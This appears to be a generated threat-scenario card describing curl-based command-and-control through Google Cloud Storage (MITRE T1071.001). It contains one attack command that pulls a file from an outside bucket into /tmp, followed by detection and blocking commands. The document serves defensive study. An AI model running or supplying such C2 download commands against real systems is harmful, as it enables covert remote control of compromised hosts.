---
type: campaign
scenario_id: 432
tactic: Command and Control
technique: "T1071.001: Application Layer Protocol: Web Protocols"
technique_id: T1071.001
tags: [campaign, lotl, command_and_control]
---

# Using curl to communicate with Google Cloud Storage for C2.

## Threat Description
Using curl to communicate with Google Cloud Storage for C2.

## Attack Command
```
curl -H "Authorization: Bearer $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 32)" https://storage.googleapis.com/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)-bucket/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt -o /tmp/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt
```

## Detection Logic
Monitor curl GCS: `ps aux | grep curl | grep storage.googleapis.com`; Network traffic: `tcpdump -i any host storage.googleapis.com`.

## Mitigation
Restrict curl: `chmod 700 /usr/bin/curl`; Block GCS: `iptables -A OUTPUT -d storage.googleapis.com -j DROP`.

## AI Training Prompt
Train AI to detect curl-based C2 via Google Cloud Storage by analyzing HTTP headers, GCS URLs, and file creation patterns; recommend storage blocking.

## References
- MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
